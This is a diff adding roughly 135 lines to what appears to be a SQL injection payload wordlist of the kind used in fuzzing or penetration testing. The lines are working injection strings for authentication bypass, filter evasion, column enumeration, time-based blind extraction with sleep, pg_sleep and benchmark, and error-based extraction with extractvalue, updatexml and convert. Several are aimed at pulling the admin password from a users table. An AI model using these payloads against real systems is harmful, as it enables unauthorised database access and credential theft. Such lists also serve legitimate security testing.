@@ -48,3 +48,138 @@ like '%'
 ' group by username having 1=1- information_Schema.tables;# admin'
 and substring(password/text(),1,1)='7 ' and substring(password/text(),1,1)='7
 ''||(select 1 from (select pg_sleep(6))x)||'
+' OORR 1=1 #
+' OORR 1<2 #
+' OORR 'a'='a' #
+' OORR @@version=@@version #
+'/**/OORR/**/1=1#
+'/**/OORR/**/'a'='a'#
+admin' --
+admin' #
+admin'/*
+admin' or '1'='1
+admin' or '1'='1'--
+admin' or '1'='1'#
+admin' or '1'='1'/*
+admin'or 1=1 or ''='
+admin' or 1=1
+admin' or 1=1--
+admin' or 1=1#
+admin' or 1=1/*
+admin'    or    1=1    --
+admin'	or	1=1	#
+admin'/**/or/**/1=1/**/--
+" or ""-"
+" or "" "
+" or ""&"
+" or ""^"
+" or ""*"
+" or ""+"
+" or ""|"
+" or ""="
+" or ""!="
+" or ""<>"
+or 1=1--
+or true--
+or 1--
+or 0=0--
+" or true--
+' or true--
+") or true--
+') or true--
+' or 'x'='x
+' or '1'='1'='1
+) or ('x')=('x
+')) or (('x'))=(('x
+" or "x"="x
+") or ("x")=("x
+' and 'one'='one
+' and '1'='1
+' and 'a'='a'--
+' and 'admin'='admin
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+' group by email having 1=1--
+' group by id having 1=1--
+like '%'
+like '%'--
+like '%'#
+like '%'/*
+' or uid like '%
+' or uname like '%
+' or uname like '%'--
+' or uname like '%'#
+' or userid like '%
+' or user like '%
+' or username like '%
+' or username like '%'--
+' or username like '%'#
+' or email like '%
+' or pass like '%
+' or password like '%
+' order by 1 --+
+' order by 2 --+
+' order by 3 --+
+' order by 4 --+
+' order by 5 --+
+' order by 100 --+
+' order by (select 1) --+
+' and "a"="a"--+
+' and 'a'='a'--+
+' and database()="security"--+
+' and database()='security'--+
+' and substring(database(),1,1)="a"--+
+' and substring(database(),1,1)='a'--+
+' and substring(database(),2,1)='e'--+
+' and sleep(2) and "a"="a"--+
+' and sleep(2) and 'a'='a'--+
+' and sleep(2) and substring(database(),1,1)="a"--+
+' and sleep(2) and substring(database(),1,1)='a'--+
+' and if(1=1,sleep(2),0)--
+' and if(substring(database(),1,1)='a',sleep(2),0)--
+' group by password having 1=1--
+' group by userid having 1=1--
+' group by username having 1=1--
+' group by id having 1=1--
+information_Schema.tables;#
+information_schema.columns;#
+information_schema.schemata;#
+admin' and 1=convert(int,(select table_name from information_schema.tables))--
+admin' and 1=convert(int,(select column_name from information_schema.columns where table_name='users'))--
+admin' and 1=convert(int,(select password from users where username='admin'))--
+''||(select 1 from (select pg_sleep(6))x)||'
+''+(select 1 from (select pg_sleep(6))x)+'
+''-(select 1 from (select pg_sleep(6))x)-'
+''*(select 1 from (select pg_sleep(6))x)*'
+''/(select 1 from (select pg_sleep(6))x)/'
+' and (select 1 from (select sleep(6))a)--
+' and (select * from (select sleep(6))a)--
+' and (select 1 from (select sleep(6))a where database()=database())--
+' and (select 1 from (select sleep(6))a where 'a'='a')--
+' and (select 1 from (select sleep(6))a where substring(database(),1,1)='s')--
+' and (select 1 from (select sleep(6))a where (select count(*) from information_schema.tables)>0)--
+' and (select 1 from (select sleep(6))a where (select count(*) from users)>0)--
+' and (select 1 from (select sleep(6))a where (select length(password) from users where username='admin')>5)--
+' and (select 1 from (select sleep(6))a where (select ascii(substring(password,1,1)) from users where username='admin')>50)--
+' and (select 1 from (select sleep(6))a where (select ascii(substring(password,1,1)) from users where username='admin')=97)--
+' and extractvalue(1,concat(0x3a,(select database())))--
+' and updatexml(1,concat(0x3a,(select database())),1)--
+' and (select 1 from (select count(*),concat((select database()),floor(rand(0)*2))x group by x.a)--
+' and (select 1 from (select count(*),concat((select password from users where username='admin'),floor(rand(0)*2))x group by x.a)--
+' and (select 1 from (select count(*),concat((select concat(username,0x3a,password) from users limit 1),floor(rand(0)*2))x group by x.a)--
+' and benchmark(10000000,sha1(1))--
+' and benchmark(10000000,md5(1))--
+' and benchmark(10000000,encode('test','test'))--
+' and (select benchmark(10000000,sha1(1)))--
+' and (select benchmark(10000000,md5(1)))--
+' and (select benchmark(10000000,encode('test','test')))--
+' and (select 1 from (select benchmark(10000000,sha1(1)))a)--
+' and (select 1 from (select benchmark(10000000,md5(1)))a)--
+' and (select 1 from (select benchmark(10000000,encode('test','test')))a)--
+' and (select 1 from (select benchmark(10000000,sha1(1)))a where 'a'='a')--
+' and (select 1 from (select benchmark(10000000,md5(1)))a where 'a'='a')--
+' and (select 1 from (select benchmark(10000000,encode('test','test')))a where 'a'='a')--
+' and (select 1 from (select benchmark(10000000,sha1(1)))a where substring(database(),1,1)='s')--
+' and (select 1 from (select benchmark(10000000,md5(1)))a where substring(database(),1,1)='s')--
+' and (select 1 from (select benchmark(10000000,encode('test','test')))a where substring(database(),1,1)='s')--
